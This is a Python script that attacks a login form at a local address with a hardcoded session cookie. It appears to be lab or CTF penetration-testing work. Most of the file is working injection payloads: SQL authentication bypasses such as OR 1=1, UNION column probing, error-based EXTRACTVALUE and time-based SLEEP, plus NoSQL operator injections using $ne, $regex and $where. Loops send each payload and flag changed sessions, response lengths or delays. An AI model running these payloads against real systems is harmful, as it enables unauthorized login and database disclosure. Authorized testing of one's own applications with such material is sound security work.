import requests
import urllib.parse
import time

# Base configuration
base_url = "http://127.0.0.1:8080"
login_endpoint = "/login.php"
cookies = {"PHPSESSID": "adf118a2717e83ee6455ea878ebb507e"}

headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Content-Type": "application/x-www-form-urlencoded"
}

print("="*70)
print("PHASE 1: ANALYZE LOGIN PAGE STRUCTURE")
print("="*70)

# Get the login page to analyze form structure
response = requests.get(f"{base_url}{login_endpoint}", cookies=cookies, timeout=10)
print(f"Login page status: {response.status_code}")
print(f"Login page length: {len(response.content)}B")
print(f"Login page snippet:\n{response.text[:800]}")

print("\n" + "="*70)
print("PHASE 2: BASELINE TESTING - Valid vs Invalid Credentials")
print("="*70)

# Test with known invalid credentials to establish baseline
baseline_payloads = [
    {"username": "invaliduser", "password": "invalidpass"},
    {"username": "", "password": ""},
    {"username": "admin", "password": "wrongpassword"},
]

baseline_results = []
for i, payload in enumerate(baseline_payloads):
    response = requests.post(
        f"{base_url}{login_endpoint}",
        data=urllib.parse.urlencode(payload),
        headers=headers,
        cookies=cookies,
        allow_redirects=False,
        timeout=10
    )
    
    result = {
        "test": f"baseline-{i+1}",
        "payload": payload,
        "status": response.status_code,
        "length": len(response.content),
        "text": response.text,
        "session_changed": "PHPSESSID" in response.cookies and response.cookies["PHPSESSID"] != cookies["PHPSESSID"]
    }
    baseline_results.append(result)
    
    print(f"\n[Baseline-{i+1}] {payload}")
    print(f"Status: {result['status']} | Length: {result['length']}B")
    print(f"Session changed: {result['session_changed']}")
    print(f"Response snippet: {result['text'][:200]}")

print("\n" + "="*70)
print("PHASE 3: ADVANCED SQL INJECTION WITH ENCODING BYPASSES")
print("="*70)

# Advanced SQLi with encoding bypasses
advanced_sqli = [
    # Comment variations
    {"username": "admin'/*", "password": "*/--"},
    {"username": "admin'%23", "password": ""},  # %23 = #
    
    # Double encoding
    {"username": "%2527%2520OR%25201%253D1--", "password": ""},
    
    # Space alternatives
    {"username": "admin'%09OR%091=1--", "password": ""},
    {"username": "admin'/**/OR/**/1=1--", "password": ""},
    
    # Parentheses bypass
    {"username": "admin'OR(1=1)AND'" , "password": ""},
    
    # UNION with NULLs (testing column count)
    {"username": "' UNION SELECT NULL--", "password": ""},
    {"username": "' UNION SELECT NULL,NULL--", "password": ""},
    {"username": "' UNION SELECT NULL,NULL,NULL--", "password": ""},
    
    # Error-based
    {"username": "' AND EXTRACTVALUE(1,CONCAT(0x7e,version(),0x7e))--", "password": ""},
    
    # Authentication bypass variants
    {"username": "' OR '1'='1' LIMIT 1--", "password": ""},
    {"username": "'=''OR''='", "password": ""},
    
    # Stacked queries (if supported)
    {"username": "admin'; SELECT SLEEP(5)--", "password": ""},
]

advanced_results = []
for i, payload in enumerate(advanced_sqli):
    try:
        start_time = time.time()
        response = requests.post(
            f"{base_url}{login_endpoint}",
            data=urllib.parse.urlencode(payload),
            headers=headers,
            cookies=cookies,
            allow_redirects=False,
            timeout=15
        )
        end_time = time.time()
        
        result = {
            "test": f"advanced-sqli-{i+1}",
            "payload": payload,
            "status": response.status_code,
            "length": len(response.content),
            "time": end_time - start_time,
            "session_changed": "PHPSESSID" in response.cookies and response.cookies["PHPSESSID"] != cookies["PHPSESSID"],
            "text": response.text
        }
        advanced_results.append(result)
        
        print(f"\n[Advanced-SQLi-{i+1}] {payload}")
        print(f"Status: {result['status']} | Length: {result['length']}B | Time: {result['time']:.2f}s")
        print(f"Session changed: {result['session_changed']}")
        
        # Check for time-based blind SQLi
        if result['time'] > 5:
            print(f"[!] TIME DELAY DETECTED - Possible time-based SQLi!")
        
        # Check if response differs from baseline
        baseline_length = baseline_results[0]['length']
        if abs(result['length'] - baseline_length) > 50:
            print(f"[!] RESPONSE LENGTH DIFFERS FROM BASELINE")
            print(f"Response snippet: {result['text'][:300]}")
        
    except Exception as e:
        print(f"[Advanced-SQLi-{i+1}] Error: {str(e)}")

print("\n" + "="*70)
print("PHASE 4: NOSQL INJECTION - ADVANCED OPERATORS")
print("="*70)

# Advanced NoSQL injection
advanced_nosql = [
    # Alternative operators
    {"username[$exists]": "true", "password[$exists]": "true"},
    {"username[$type]": "string", "password[$ne]": ""},
    
    # Nested objects
    {"username": {"$in": ["admin", "root", "administrator"]}, "password": {"$ne": ""}},
    
    # JavaScript injection (if $where is enabled)
    {"username": {"$where": "this.username == 'admin'"}, "password": {"$ne": ""}},
    
    # Regex extraction
    {"username": {"$regex": "^admin"}, "password": {"$ne": ""}},
    
    # Array injection
    {"username": ["admin"], "password": {"$ne": ""}},
    
    # True/False manipulation
    {"username": True, "password": True},
    {"username": {"$eq": True}, "password": {"$ne": False}},
]

for i, payload in enumerate(advanced_nosql):
    try:
        response = requests.post(
            f"{base_url}{login_endpoint}",
            data=urllib.parse.urlencode(payload),
            headers=headers,
            cookies=cookies,
            allow_redirects=False,
            timeout=10
        )
        
        result = {
            "test": f"advanced-nosql-{i+1}",
            "status": response.status_code,
            "length": len(response.content),
            "session_changed": "PHPSESSID" in response.cookies and response.cookies["PHPSESSID"] != cookies["PHPSESSID"],
            "text": response.text
        }
        
        print(f"\n[Advanced-NoSQL-{i+1}] {payload}")
        print(f"Status: {result['status']} | Length: {result['length']}B")
        print(f"Session changed: {result['session_changed']}")
        
        baseline_length = baseline_results[0]['length']
        if abs(result['length'] - baseline_length) > 50:
            print(f"[!] RESPONSE DIFFERS FROM BASELINE")
            print(f"Snippet: {result['text'][:300]}")
        
    except Exception as e:
        print(f"[Advanced-NoSQL-{i+1}] Error: {str(e)}")

print("\n" + "="*70)
print("PHASE 5: BLIND INJECTION - RESPONSE ANALYSIS")
print("="*70)

# Analyze all responses for patterns
all_results = baseline_results + advanced_results

print(f"\nTotal tests conducted: {len(all_results)}")

# Group by response length
lengths = {}
for result in all_results:
    length = result['length']
    if length not in lengths:
        lengths[length] = []
    lengths[length].append(result['test'])

print(f"\nResponse length distribution:")
for length, tests in sorted(lengths.items()):
    print(f"  {length}B: {len(tests)} tests - {tests}")

# If we have different lengths, investigate
if len(lengths) > 1:
    print(f"\n[!] DIFFERENT RESPONSE LENGTHS DETECTED - Possible vulnerability!")
    for length, tests in lengths.items():
        if len(tests) < len(all_results) * 0.3:  # Minority response
            print(f"  Anomalous length {length}B appears in: {tests}")
            # Find one example
            for result in all_results:
                if result['length'] == length:
                    print(f"  Example response: {result['text'][:400]}")
                    break

# Check for error messages
error_patterns = ['error', 'syntax', 'mysql', 'sql', 'database', 'exception', 'warning']
print(f"\nError pattern analysis:")
for result in all_results:
    text_lower = result['text'].lower()
    found_errors = [pattern for pattern in error_patterns if pattern in text_lower]
    if found_errors:
        print(f"  {result['test']}: {found_errors}")

print("\n" + "="*70)
print("SUMMARY AND RECOMMENDATIONS")
print("="*70)

print(f"\nBaseline established with {len(baseline_results)} invalid credential tests")
print(f"SQL injection tests: {len(advanced_sqli)} advanced payloads")
print(f"NoSQL injection tests: {len(advanced_nosql)} advanced payloads")

# Check if any test succeeded
session_changes = sum(1 for r in all_results if r.get('session_changed', False))
different_lengths = len(lengths) > 1
time_delays = sum(1 for r in advanced_results if r.get('time', 0) > 5)

print(f"\nKey findings:")
print(f"  - Session changes: {session_changes}")
print(f"  - Different response lengths: {different_lengths}")
print(f"  - Time delays detected: {time_delays}")

if session_changes > 0:
    print(f"\n[CRITICAL] Session manipulation detected - authentication bypass possible!")
if different_lengths:
    print(f"\n[WARNING] Inconsistent responses suggest application logic flaws")
if time_delays > 0:
    print(f"\n[WARNING] Time delays suggest possible time-based blind injection")

if session_changes == 0 and not different_lengths and time_delays == 0:
    print(f"\n[RESULT] No clear injection vulnerabilities detected with current payloads")
    print(f"Recommendations:")
    print(f"  1. Test different parameter names (not just username/password)")
    print(f"  2. Try different content types (multipart/form-data)")
    print(f"  3. Test HTTP headers (User-Agent, X-Forwarded-For)")
    print(f"  4. Analyze JavaScript for client-side validation bypass")
    print(f"  5. Test with valid credentials to see success response")

print("\n" + "="*70)

